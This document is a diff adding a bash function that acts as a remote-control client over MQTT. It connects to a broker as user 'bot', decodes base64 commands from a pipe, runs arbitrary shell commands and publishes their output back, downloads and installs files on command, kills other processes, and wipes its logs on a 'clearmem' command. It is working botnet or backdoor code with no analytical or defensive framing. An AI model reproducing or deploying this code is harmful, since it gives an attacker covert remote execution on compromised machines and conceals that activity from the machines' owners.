@@ -1,0 +1,76 @@
+# vim: syntax=bash
+run(){
+cd $workdir
+denc=$workdir/denc
+$mq_debug && echo Host: "$mq_host" ;echo Pass :"$mq_pass" ;echo Debug: "$mq_debug" ;echo Path:"$mq_path"
+
+if [[ ! -p $pipe ]]; then mkfifo $pipe ;fi
+(subclient -h $mq_host -q 2 -i $mq_ip -t shell/$mq_ip -t shell/$mq_subtop -u bot -P $mq_pass --will-payload "Client $mq_ip Disconnect" --will-topic data/dead 2>>$errorlog > $pipe) & echo "$!" > $subpidfile
+$mq_debug ||customFunc killtn &
+sendClientHello &
+while read line; do
+$mq_debug &&  echo '[>>] Got a command!'
+echo "${line}" | base64 -d 2>> $errorlog >$denc
+$mq_debug &&  echo '[>>] Echoed line to file.'
+if [[ -s "$denc" ]] ; then
+
+case "$(cat $denc)" in
+__quit__)
+if $mq_debug ; then
+  echo '[warn] Received quit, bailing...'
+  quit >>$errorlog
+fi
+;;
+__update__)
+if $mq_debug ; then
+  echo '[warn] Received update, getting new config...'
+fi
+kill "$(cat $subpidfile)" >>$errorlog 2>&1
+break
+;;
+__killall__)
+if [ mq_debug == "1" ]; then
+  echo '[info] Received a killall, getting new config...'
+fi
+killThreads >/dev/null 2>&1  &
+  
+;;
+_clearmem_)
+if $mq_debug ; then 
+  echo '[info] Received clearenv, deleting the logs...'
+fi
+clearmem >/dev/null 2>&1 &
+;;
+
+_get_*)
+if $mq_debug ; then 
+  echo "Received a get, downloading and installing file..."
+fi
+getcmd="$(cat $denc | sed s'/__get__//')"
+repoGet "${getcmd}" >>$errorlog 2>&1  &
+;;
+
+_SH_*)
+if $mq_debug ; then 
+  echo "Received an _SH_ command, will exec..."
+fi
+shcmd="$(cat $denc|sed s'/_SH_//')"
+echo $shcmd 2>/dev/null > /tmp/shcmd
+(($shell /tmp/shcmd 2>>$errorlog | base64)|(pubclient -h $mq_host -i $mq_ip -q 0 -t "data/$mq_pubtop" -u bot -P $mq_pass -s;rm -f /tmp/shcmd)& >>$errorlog 2>&1 )&
+;;
+
+*)
+if $mq_debug ; then 
+  echo "[*] Received a command, will exec..."
+fi
+cmd="$(cat $denc)" ; execute "${cmd}" &
+if ([[ "$?" -eq "0" ]] && [[ $mq_debug ]]); then  
+echo '[*] Executed the command...'
+fi
+
+;;
+esac
+>$denc
+fi
+done <$pipe
+}
